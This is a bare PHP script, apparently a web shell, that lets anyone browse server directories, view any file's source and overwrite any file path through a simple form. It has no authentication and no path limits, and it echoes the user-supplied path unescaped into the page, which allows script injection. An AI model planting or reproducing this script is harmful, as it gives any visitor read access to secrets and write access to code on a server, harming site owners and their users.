<?php
if(isset($_GET['file']))
	$file=$_GET['file'];
if(isset($_POST['file']))
	$file=$_POST['file'];
?>
<form method="POST">
  <input type="text" name="file" class="url" value="<?echo $file;?>">
  <input type="submit" name='read' value='read'>
   <input type="submit" name='edit' value="edit">
   <br>
</form>
<?
if(is_dir($file))
{
	$me=$_SERVER['PHP_SELF'];
	$place=strrpos($file,'/');
	if($place!==false&&substr($file,-2)!='..')
		$up=substr($file,0,$place);
	else
		$up=$file."/..";
	echo "<h2><a href='$me?file=$up'>$up<br></a></h2>";
	$handle=opendir($file);
	while ($files = readdir($handle))
	if(!is_dir($file.'/'.$files))
		echo "<a href='$me?file=$file/$files'>$files<br>";
	elseif($files != "." && $files != "..")
		echo "<a href='$me?file=$file/$files'>$files</a><br>";
	closedir($handle);
	die;
}
if(isset($_POST['editor1']))
	file_put_contents($_POST['file'], stripslashes(html_entity_decode($_POST['editor1'])));	
  if(isset($file))
  {
	if(isset($_POST['edit']))
	{
	  echo '<form method="post"> <textarea name="editor1" cols="100" rows=25>';
	  echo htmlentities(file_get_contents($file));
	  echo "</textarea><br>Save and then
	  <input type='submit' name='read' value='read'> or 
	  <input type='submit' name='edit' value='continue editing'><input type='hidden' name='file' value='$file'>";
	}
	else
		highlight_file($file);
  }
?>